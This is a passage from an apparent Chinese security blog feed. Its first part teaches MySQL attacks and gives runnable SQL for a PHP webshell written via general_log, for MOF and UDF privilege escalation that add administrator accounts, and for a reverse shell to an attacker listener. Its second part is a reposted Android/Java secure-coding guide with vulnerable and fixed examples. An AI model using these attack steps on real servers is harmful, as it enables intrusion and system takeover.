general_log=<span class="string">'on'</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">'/home/wwwroot/shadowyspirits/evil.php'</span>;</span><br><span class="line">SELECT <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure><p>设置了 <code>general_log</code> 和 <code>general_log_file</code> 之后所有SQL记录都会写入指定的文件，所以会导致 log 文件非常大，推荐只暂时打开</p><p>需要注意的是 <code>secure_file_priv</code> 是只读属性，如果试图使用 <code>set global</code> 修改会报如下 Error</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error Code: 1238. Variable &apos;secure_file_priv&apos; is a read only</span><br></pre></td></tr></table></figure><h2 id="防御姿势"><a href="#防御姿势" class="headerlink" title="防御姿势"></a>防御姿势</h2><ul><li>设置 <code>secure_file_prive = null</code> （不允许导入和导出）</li><li>防止暴露网站绝对路径</li><li>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload </li><li>目录不授予执行权限</li></ul><hr><h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><p>MYSQL提权一般有三种方法：</p><ul><li>mof提权</li><li>udf提权</li><li>反弹shell</li></ul><hr><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><p>在windows平台下，<code>c:/windows/system32/wbem/mof/nullevt.mof</code>这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>mysql用户具有root权限(对上面那个目录可写）</li><li>关闭了<code>secure-file-priv</code></li></ul><h3 id="3-利用方式"><a href="#3-利用方式" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><p>下面是一段写好了的mof利用代码</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace("\\\\.\\root\\subscription") </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123; </span><br><span class="line">EventNamespace = "Root\\Cimv2"; </span><br><span class="line">Name  = "filtP2"; </span><br><span class="line">    Query = "Select \ From __InstanceModificationEvent "  </span><br><span class="line">            "Where TargetInstance Isa \"Win32_LocalTime\" " </span><br><span class="line">            "And TargetInstance.Second = <span class="number">5</span>"; </span><br><span class="line">QueryLanguage = "WQL"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = "consPCSV2"; </span><br><span class="line">ScriptingEngine = "JScript"; </span><br><span class="line">ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"<span class="built_in">net</span>.exe user admin admin /add")"; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer;  </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为<code>nullevt.mof</code>上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到<code>c:/windows/system32/wbem/mof/</code>就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为nullevt.mof上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到c:/windows/system32/wbem/mof/就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;你上传的路径/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure><p>执行完后，你可以在你的webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了。</p><hr><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="1.原理"></a>1.原理</h3><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p><h3 id="2-利用条件-1"><a href="#2-利用条件-1" class="headerlink" title="2.利用条件"></a>2.利用条件</h3><ul><li>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的<code>lib\plugin</code>文件夹下。</li><li>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于c:\winnt\system32。</li><li>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</li><li>可以将udf.dll写入到相应目录的权限。</li></ul><blockquote><p>注：关于plugin目录，可在mysql中执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure><p>进行查看，这个目录也就是dll文件需要导入的目录</p></blockquote><h3 id="3-利用方式-1"><a href="#3-利用方式-1" class="headerlink" title="3.利用方式"></a>3.利用方式</h3><ul><li>将dll文件导入到相应目录，如果导入错误会产生<code>cant open shared library</code>错误</li><li>创建自定义函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure><blockquote><p>注意这里的函数名应该与dll文件中的函数名一致。</p></blockquote><p>当然关于udf有一个特别需要注意的问题，就是5.1以上版本默认情况下<code>/lib/plugin</code>目录是不存在的，还好有大牛已经想出了解决办法——<code>NTFS ADS流</code>来创建文件夹（该方法我们测试过）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><blockquote><p>注：udf提权也是一般应用于win2000、win2003系统</p></blockquote><hr><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>其实这也属于udf提权，只不过应用场景不同，比如现在我们没有webshell但是我们却有偶然得到了mysql的root密码（弱口令等），恰巧目标机的数据库可以外联或者有phpmyadmin，那么我们就可以把上面<code>udf.dll</code>文件的内容先插入到数据表中，然后再导出到<code>/lib/plugin</code>目录。</p><blockquote><p>注：这里我看到网上的资料都是讲mysql.txt导入到数据库中，mysql.txt也就是udf.dll文件的2进制转换为16进制，这里我不太清楚为什么需要转成十六进制，但是我知道如果udf.dll文件成功导入到plugin目录是可以成功反弹shell的</p></blockquote><ul><li>创建函数backshell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;mysqldll.dll&apos;; //创建backshell</span><br></pre></td></tr></table></figure><ul><li>在具备独立主机的服务器上执行监听</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 12345</span><br></pre></td></tr></table></figure><ul><li>执行backshell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell("你的ip地址",12345);</span><br></pre></td></tr></table></figure><p>但是我是通过webshell将udf.dll导入plugin目录完成的，如果成功返回了shell则说明成功了，我们就可以添加用户了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MYSQL写Webshell&quot;&gt;&lt;a href=&quot;#MYSQL写Webshell&quot; class=&quot;headerlink&quot; title=&quot;MYSQL写Webshell&quot;&gt;&lt;/a&gt;MYSQL写Webshell&lt;/h1&gt;&lt;p&gt;写Webshell比较常见的方法有：&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计-DAY4</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY4/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY4/</id>
    <published>2020-03-02T06:57:00.000Z</published>
    <updated>2020-03-03T03:51:19.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计-DAY4"><a href="#Java审计-DAY4" class="headerlink" title="Java审计-DAY4"></a>Java审计-DAY4</h1><p>转载自 <a href="https://blog.csdn.net/niexinming/article/details/84595405" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/84595405</a> </p><h1 id="外部文件访问-Android"><a href="#外部文件访问-Android" class="headerlink" title="外部文件访问(Android)"></a>外部文件访问(Android)</h1><p>漏洞特征：ANDROID_EXTERNAL_FILE_ACCESS<br>应用经常往外部存储上写数据（可能是SD卡），这个操作可能会有多个安全问题。首先应用可以可以通过<a href="http://developer.android.com/reference/android/Manifest.permission.html#READ_EXTERNAL_STORAGE" target="_blank" rel="noopener">READ_EXTERNAL_STORAGE</a> 获取SD卡上存储的文件。而且如果数据中包含用户的敏感信息的话，那么需要把这些数据加密。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file file = new File(getExternalFilesDir(TARGET_TYPE), filename);</span><br><span class="line">fos = new FileOutputStream(file);</span><br><span class="line">fos.write(confidentialData.getBytes());</span><br><span class="line">fos.flush();</span><br></pre></td></tr></table></figure><p>更好的措施：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fos = openFileOutput(filename, Context.MODE_PRIVATE);</span><br><span class="line">fos.write(string.getBytes());</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://developer.android.com/training/articles/security-tips.html#ExternalStorage" target="_blank" rel="noopener">Android Official Doc: Security Tips</a><br><a href="https://www.securecoding.cert.org/confluence/display/java/DRD00-J.+Do+not+store+sensitive+information+on+external+storage+(SD+card)+unless+encrypted+first" target="_blank" rel="noopener">CERT: DRD00-J: Do not store sensitive information on external storage</a><br><a href="http://developer.android.com/guide/topics/data/data-storage.html#filesExternal" target="_blank" rel="noopener">Android Official Doc: Using the External Storage</a><br><a href="https://www.owasp.org/index.php/Mobile_Top_10_2014-M2" target="_blank" rel="noopener">OWASP Mobile Top 10 2014-M2: Insecure Data Storage</a><br><a href="https://cwe.mitre.org/data/definitions/312.html" target="_blank" rel="noopener">CWE-312: Cleartext Storage of Sensitive Information</a></p><h1 id="Broadcast漏洞-Android"><a href="#Broadcast漏洞-Android" class="headerlink" title="Broadcast漏洞(Android)"></a>Broadcast漏洞(Android)</h1><p>漏洞规则：ANDROID_BROADCAST<br>所有应用通过申请适当权限就可以监听Broadcast的意图，所以尽量不要通过Broadcast传输敏感数据。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">i.setAction(&quot;com.insecure.action.UserConnected&quot;);</span><br><span class="line">i.putExtra(&quot;username&quot;, user);</span><br><span class="line">i.putExtra(&quot;email&quot;, email);</span><br><span class="line">i.putExtra(&quot;session&quot;, newSessionId);</span><br><span class="line"></span><br><span class="line">this.sendBroadcast(v1);</span><br></pre></td></tr></table></figure><p>解决方案（如果有可能的话）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">i.setAction(&quot;com.secure.action.UserConnected&quot;);</span><br><span class="line"></span><br><span class="line">sendBroadcast(v1);</span><br></pre></td></tr></table></figure><p>配置（接收者）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest ...&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Permission declaration --&gt;</span><br><span class="line">    &lt;permission android:name=&quot;my.app.PERMISSION&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;receiver</span><br><span class="line">        android:name=&quot;my.app.BroadcastReceiver&quot;</span><br><span class="line">        android:permission=&quot;my.app.PERMISSION&quot;&gt; &lt;!-- Permission enforcement --&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">            &lt;action android:name=&quot;com.secure.action.UserConnected&quot; /&gt;</span><br><span class="line">        &lt;/intent-filter&gt;</span><br><span class="line">    &lt;/receiver&gt;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure><p>配置（发送者）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest&gt;</span><br><span class="line">    &lt;!-- We declare we own the permission to send broadcast to the above receiver --&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;my.app.PERMISSION&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- With the following configuration, both the sender and the receiver apps need to be signed by the same developer certificate. --&gt;</span><br><span class="line">    &lt;permission android:name=&quot;my.app.PERMISSION&quot; android:protectionLevel=&quot;signature&quot;/&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://www.securecoding.cert.org/confluence/display/java/DRD03-J.+Do+not+broadcast+sensitive+information+using+an+implicit+intent" target="_blank" rel="noopener">CERT: DRD03-J. Do not broadcast sensitive information using an implicit intent</a><br><a href="http://developer.android.com/reference/android/content/BroadcastReceiver.html#Security" target="_blank" rel="noopener">Android Official Doc: BroadcastReceiver (Security)</a><br><a href="http://developer.android.com/guide/topics/manifest/receiver-element.html" target="_blank" rel="noopener">Android Official Doc: Receiver configuration (see android:permission)</a><br>[1] <a href="http://stackoverflow.com/a/21513368/89769" target="_blank" rel="noopener">StackOverflow: How to set permissions in broadcast sender and receiver in android</a><br><a href="https://cwe.mitre.org/data/definitions/925.html" target="_blank" rel="noopener">CWE-925: Improper Verification of Intent by Broadcast Receiver</a><br><a href="https://cwe.mitre.org/data/definitions/927.html" target="_blank" rel="noopener">CWE-927: Use of Implicit Intent for Sensitive Communication</a></p><h1 id="任意文件写-Android"><a href="#任意文件写-Android" class="headerlink" title="任意文件写 (Android)"></a>任意文件写 (Android)</h1><p>创建文件使用MODE_WORLD_READABLE模式，可以让文件写入环境中的任意位置。一些文件文件被改写的话，可能会发生一些不希望发生的事情。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fos = openFileOutput(filename, MODE_WORLD_READABLE);</span><br><span class="line">fos.write(userInfo.getBytes());</span><br></pre></td></tr></table></figure><p>解决方案（使用MODE_PRIVATE）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fos = openFileOutput(filename, MODE_PRIVATE);</span><br></pre></td></tr></table></figure><p>解决方案（使用本地SQLite数据库）<br>使用本地SQLite数据库可能是存储结构数据最好的解决方案了。要确定数据库文件不会被创建到外部存储中。见下面的开发文档引用</p><p>引用：<br><a href="https://www.securecoding.cert.org/confluence/display/java/DRD11-J.+Ensure+that+sensitive+data+is+kept+secure" target="_blank" rel="noopener">CERT: DRD11-J. Ensure that sensitive data is kept secure</a><br><a href="http://developer.android.com/training/articles/security-tips.html#InternalStorage" target="_blank" rel="noopener">Android Official Doc: Security Tips</a><br><a href="http://developer.android.com/reference/android/content/Context.html#MODE_PRIVATE" target="_blank" rel="noopener">Android Official Doc: Context.MODE_PRIVATE</a><br><a href="http://www.vogella.com/tutorials/AndroidSQLite/article.html#databasetutorial_database" target="_blank" rel="noopener">vogella.com: Android SQLite database and content provider - Tutorial</a><br><a href="https://www.owasp.org/index.php/Mobile_Top_10_2014-M2" target="_blank" rel="noopener">OWASP Mobile Top 10 2014-M2: Insecure Data Storage</a><br><a href="https://cwe.mitre.org/data/definitions/312.html" target="_blank" rel="noopener">CWE-312: Cleartext Storage of Sensitive Information</a></p><h1 id="已激活地理位置的WebView-Android"><a href="#已激活地理位置的WebView-Android" class="headerlink" title="已激活地理位置的WebView(Android)"></a>已激活地理位置的WebView(Android)</h1><p>漏洞特征：ANDROID_GEOLOCATION<br>建议去询问用户是否能获取他们的位置信息<br>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebChromeClient(new WebChromeClient() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) &#123;</span><br><span class="line">        callback.invoke(origin, true, false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>建议代码：<br>限制使用地理位置的例子，并且要得到用户的确认</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebChromeClient(new WebChromeClient() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) &#123;</span><br><span class="line">        callback.invoke(origin, true, false);</span><br><span class="line"></span><br><span class="line">        //Ask the user for confirmation</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://www.securecoding.cert.org/confluence/display/java/DRD15-J.+Consider+privacy+concerns+when+using+Geolocation+API" target="_blank" rel="noopener">CERT: DRD15-J. Consider privacy concerns when using Geolocation API</a><br><a href="http://en.wikipedia.org/wiki/W3C_Geolocation_API" target="_blank" rel="noopener">Wikipedia: W3C Geolocation API</a><br><a href="http://dev.w3.org/geo/api/spec-source.html" target="_blank" rel="noopener">W3C: Geolocation Specification</a></p><h1 id="允许JavaScript脚本运行的webview-Android"><a href="#允许JavaScript脚本运行的webview-Android" class="headerlink" title="允许JavaScript脚本运行的webview (Android)"></a>允许JavaScript脚本运行的webview (Android)</h1><p>漏洞特征：ANDROID_WEB_VIEW_JAVASCRIPT<br>WebView如果允许允许JavaScript脚本的话，就意味着它会受到xss的影响。应该检查页面的渲染，以避免潜在的反射型xss，存储型xss，dom型xss。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebView myWebView = (WebView) findViewById(R.id.webView);</span><br><span class="line">WebSettings webSettings = myWebView.getSettings();</span><br><span class="line">webSettings.setJavaScriptEnabled(true);</span><br></pre></td></tr></table></figure><p>有漏洞的代码：<br>允许JavaScript运行是一个坏的习惯。这就意味着后端代码需要被审计，以避免xss。xss也会使用dom xss的形式引入到客户端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function updateDescription(newDescription) &#123;</span><br><span class="line">    $(&quot;#userDescription&quot;).html(&quot;&lt;p&gt;&quot;+newDescription+&quot;&lt;/p&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://www.technotalkative.com/issue-using-setjavascriptenabled-can-introduce-xss-vulnerabilities-application-review-carefully/" target="_blank" rel="noopener">Issue: Using setJavaScriptEnabled can introduce XSS vulnerabilities</a><br><a href="http://developer.android.com/guide/webapps/webview.html#UsingJavaScript" target="_blank" rel="noopener">Android Official Doc: WebView</a><br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></p><h1 id="带有JavaScript接口的WebView-Android"><a href="#带有JavaScript接口的WebView-Android" class="headerlink" title="带有JavaScript接口的WebView (Android)"></a>带有JavaScript接口的WebView (Android)</h1><p>漏洞特征:ANDROID_WEB_VIEW_JAVASCRIPT_INTERFACE<br>使用JavaScript接口可能会将WebView暴露给有危害的api。如果在WebView中触发xss的话，恶意的JavaScript代码会钓鱼一些敏感的类。<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">WebView myWebView = (WebView) findViewById(R.id.webView);</span><br><span class="line"></span><br><span class="line">myWebView.addJavascriptInterface(new FileWriteUtil(this), &quot;fileWriteUtil&quot;);</span><br><span class="line"></span><br><span class="line">WebSettings webSettings = myWebView.getSettings();</span><br><span class="line">webSettings.setJavaScriptEnabled(true);</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">class FileWriteUtil &#123;</span><br><span class="line">    Context mContext;</span><br><span class="line"></span><br><span class="line">    FileOpenUtil(Context c) &#123;</span><br><span class="line">        mContext = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void writeToFile(String data, String filename, String tag) &#123;</span><br><span class="line">        [...]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br>[Android Official Doc: WebView.addJavascriptInterface()](<a href="http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface" target="_blank" rel="noopener">http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface</a>(java.lang.Object, java.lang.String))<br><a href="https://cwe.mitre.org/data/definitions/749.html" target="_blank" rel="noopener">CWE-749: Exposed Dangerous Method or Function</a></p><h1 id="没有用secure标志的cookie"><a href="#没有用secure标志的cookie" class="headerlink" title="没有用secure标志的cookie"></a>没有用secure标志的cookie</h1><p>漏洞特征：INSECURE_COOKIE<br>一个新的cookie的创建应该设置Secure标志。Secure标志命令浏览器确保cookie不会通过不安全的链路发送(http://)<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = new Cookie(&quot;userName&quot;,userName);</span><br><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure><p>解决方案（特殊的设置):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = new Cookie(&quot;userName&quot;,userName);</span><br><span class="line">cookie.setSecure(true); // Secure flag</span><br><span class="line">cookie.setHttpOnly(true);</span><br></pre></td></tr></table></figure><p>解决方案（Servlet 3.0 配置）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; version=&quot;3.0&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;session-config&gt;</span><br><span class="line"> &lt;cookie-config&gt;</span><br><span class="line">  &lt;http-only&gt;true&lt;/http-only&gt;</span><br><span class="line">  &lt;secure&gt;true&lt;/secure&gt;</span><br><span class="line"> &lt;/cookie-config&gt;</span><br><span class="line">&lt;/session-config&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/614.html" target="_blank" rel="noopener">CWE-614: Sensitive Cookie in HTTPS Session Without ‘Secure’ Attribute</a><br><a href="https://cwe.mitre.org/data/definitions/315.html" target="_blank" rel="noopener">CWE-315: Cleartext Storage of Sensitive Information in a Cookie</a><br><a href="https://cwe.mitre.org/data/definitions/311.html" target="_blank" rel="noopener">CWE-311: Missing Encryption of Sensitive Data</a><br><a href="https://www.owasp.org/index.php/SecureFlag" target="_blank" rel="noopener">OWASP: Secure Flag</a><br><a href="https://www.rapid7.com/db/vulnerabilities/http-cookie-secure-flag" target="_blank" rel="noopener">Rapid7: Missing Secure Flag From SSL Cookie</a></p><h1 id="没有用HttpOnly标志的cookie"><a href="#没有用HttpOnly标志的cookie" class="headerlink" title="没有用HttpOnly标志的cookie"></a>没有用HttpOnly标志的cookie</h1><p>漏洞特征：HTTPONLY_COOKIE<br>一个新的cookie的创建应该设置Secure标志。Secure标志命令浏览器确保cookie不会被恶意脚本读取。当用户是“跨站脚本攻击”的目标的时候，攻击者会获得用户的session id，从而能够接管用户的账户。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = new Cookie(&quot;email&quot;,userName);</span><br><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure><p>解决方案（特殊的设置):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = new Cookie(&quot;email&quot;,userName);</span><br><span class="line">cookie.setSecure(true);</span><br><span class="line">cookie.setHttpOnly(true); //HttpOnly flag</span><br></pre></td></tr></table></figure><p>解决方案（Servlet 3.0 配置）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; version=&quot;3.0&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;session-config&gt;</span><br><span class="line"> &lt;cookie-config&gt;</span><br><span class="line">  &lt;http-only&gt;true&lt;/http-only&gt;</span><br><span class="line">  